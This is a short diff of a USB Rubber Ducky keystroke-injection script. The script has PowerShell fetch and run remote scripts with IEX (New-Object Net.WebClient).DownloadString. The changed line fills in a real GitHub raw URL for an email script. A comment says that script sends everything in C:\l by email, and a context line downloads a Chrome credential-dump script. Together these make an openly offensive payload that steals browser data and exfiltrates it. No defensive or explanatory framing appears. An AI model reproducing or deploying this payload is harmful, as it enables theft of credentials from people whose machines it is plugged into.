@@ -33,7 +33,7 @@ STRING IEX (New-Object Net.WebClient).DownloadString('Location of chrome dump .p
 ENTER
 DELAY 2000
 REM  *** time to send an email everything in C:\l ***
-STRING IEX (New-Object Net.WebClient).DownloadString('location of email .ps1')
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ninjaspl0it/Rubber-Ducky/master/email.ps1')
 ENTER
 DELAY 1500
 STRING exit
